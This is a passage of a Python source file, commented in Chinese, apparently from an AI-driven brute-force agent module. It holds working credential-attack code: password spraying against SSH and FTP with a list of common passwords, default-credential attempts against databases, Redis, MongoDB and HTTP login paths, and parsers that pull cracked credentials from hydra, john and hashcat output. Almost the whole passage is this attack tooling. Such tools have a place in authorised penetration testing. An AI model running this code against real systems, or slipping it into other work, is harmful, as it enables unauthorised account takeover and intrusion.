            'P@ssw0rd', 'Admin123', 'password1', 'Welcome1',
            'Changeme1', 'Qwerty123', 'Summer2024', 'Winter2024'
        ])
        findings = []

        self._emit_thinking("plan",
            "🔫 密码喷洒策略\n"
            "   协议: {} | 目标: {}:{}\n"
            "   喷洒密码: {} 个\n"
            "   用户列表: {} 个".format(
                protocol.upper(), hostname, port,
                len(spray_passwords), len(self.COMMON_USERS)
            ))

        for password in spray_passwords[:8]:  # 限制密码数量降低锁定风险
            for username in self.COMMON_USERS[:15]:
                if protocol == 'ssh':
                    result = await self._try_ssh_login(hostname, port, username, password)
                elif protocol == 'ftp':
                    result = await self._try_ftp_login(hostname, port, username, password)
                else:
                    continue

                if result.get('success'):
                    findings.append({
                        "type": "密码喷洒", "protocol": protocol.upper(),
                        "host": hostname, "port": port,
                        "username": username, "password": password,
                        "vulnerable": True, "severity": "critical"
                    })
                    self._emit_thinking("evaluate",
                        "🚨 密码喷洒命中! {}:{} {}={}".format(hostname, port, username, password))

                await asyncio.sleep(1)  # 降低速率

        return {'success': True, 'tool': 'password_spraying', 'findings': findings, 'total': len(findings)}

    async def _do_default_credentials(self, target: str, params: Dict) -> Dict:
        """默认凭据快速检测 — 覆盖20+种服务"""
        hostname = self._extract_hostname(target)
        services = params.get('services', [])
        port = params.get('port', 0)
        findings = []

        # 如果指定了服务类型，直接测试
        if services:
            for svc in services:
                svc_lower = svc.lower()
                if svc_lower in self.DEFAULT_CREDENTIALS:
                    for username, password in self.DEFAULT_CREDENTIALS[svc_lower]:
                        result = await self._try_service_login(
                            hostname, port, svc_lower, username, password)
                        if result.get('success'):
                            findings.append({
                                "type": "默认凭据", "service": svc_lower.upper(),
                                "host": hostname, "port": port,
                                "username": username, "password": password or '(空密码)',
                                "vulnerable": True, "severity": "critical"
                            })
                            break
        else:
            # 遍历所有服务的默认凭据
            for svc_name, cred_list in self.DEFAULT_CREDENTIALS.items():
                for username, password in cred_list[:3]:  # 每服务最多3组
                    result = await self._try_service_login(
                        hostname, port, svc_name, username, password)
                    if result.get('success'):
                        findings.append({
                            "type": "默认凭据", "service": svc_name.upper(),
                            "host": hostname, "port": port,
                            "username": username, "password": password or '(空密码)',
                            "vulnerable": True, "severity": "critical"
                        })

        return {'success': True, 'tool': 'default_credentials', 'findings': findings, 'total': len(findings)}

    async def _try_service_login(self, hostname: str, port: int,
                                  service: str, username: str, password: str) -> Dict:
        """通用服务登录尝试"""
        try:
            if service in ('ssh',):
                return await self._try_ssh_login(hostname, port or 22, username, password)
            elif service in ('ftp',):
                return await self._try_ftp_login(hostname, port or 21, username, password)
            elif service in ('mysql', 'mssql', 'postgres', 'oracle', 'redis', 'mongodb'):
                return await self._try_db_login(hostname, port, service, username, password)
            else:
                # HTTP类 - 尝试常见登录路径
                import requests
                for path in ['/login', '/admin', f'/{service}', '/api/login']:
                    login_url = f"http://{hostname}:{port or 80}{path}"
                    try:
                        data = {'username': username, 'password': password,
                               'user': username, 'pass': password,
                               'login': username, 'pwd': password}
                        resp = requests.post(login_url, data=data, timeout=5,
                                           verify=_VERIFY_SSL, allow_redirects=True)
                        if resp.status_code == 200:
                            failure_sig = ['error', 'failed', 'invalid', 'wrong', 'incorrect', 'denied']
                            if not any(sig in resp.text.lower() for sig in failure_sig):
                                success_sig = ['dashboard', 'welcome', 'logout', 'admin', 'manage']
                                if any(sig in resp.url.lower() or sig in resp.text.lower() for sig in success_sig):
                                    return {'success': True}
                    except Exception:
                        continue
        except Exception:
            pass

        return {'success': False}

    # ==========================================================================
    # 辅助方法
    # ==========================================================================

    def _extract_hostname(self, target: str) -> str:
        """从目标中提取主机名/IP"""
        if target.startswith(('http://', 'https://')):
            from urllib.parse import urlparse
            parsed = urlparse(target)
            return parsed.hostname or target
        # 去掉端口
        if ':' in target and not target.startswith('['):
            return target.split(':')[0]
        return target.strip()

    def _parse_hydra_output(self, output: str) -> List[tuple]:
        """解析hydra输出，提取破解的凭据"""
        creds = []
        # hydra格式: [22][ssh] host: login:password
        pattern = r'\[.*?\]\[.*?\]\s+\S+:\s+login:\s*(\S+)\s+password:\s*(\S+)'
        for match in re.finditer(pattern, output):
            username = match.group(1)
            password = match.group(2)
            creds.append((username, password))
        return creds

    def _parse_john_output(self, output: str) -> List[tuple]:
        """解析john输出"""
        cracked = []
        # john格式: username:password
        for line in output.split('\n'):
            if ':' in line and not line.startswith('Loaded') and not line.startswith('No password'):
                parts = line.strip().split(':', 1)
                if len(parts) == 2:
                    cracked.append((parts[0], parts[1]))
        return cracked

    def _parse_hashcat_output(self, output: str) -> List[str]:
        """解析hashcat --show输出"""
        cracked = []
        for line in output.strip().split('\n'):
            if ':' in line:
                # hash:plaintext
                parts = line.rsplit(':', 1)
                if len(parts) == 2 and parts[1]:
                    cracked.append(parts[1])
        return cracked


if __name__ == "__main__":
    print("暴力破解Agent模块已加载（含SmartAgent升级版）")
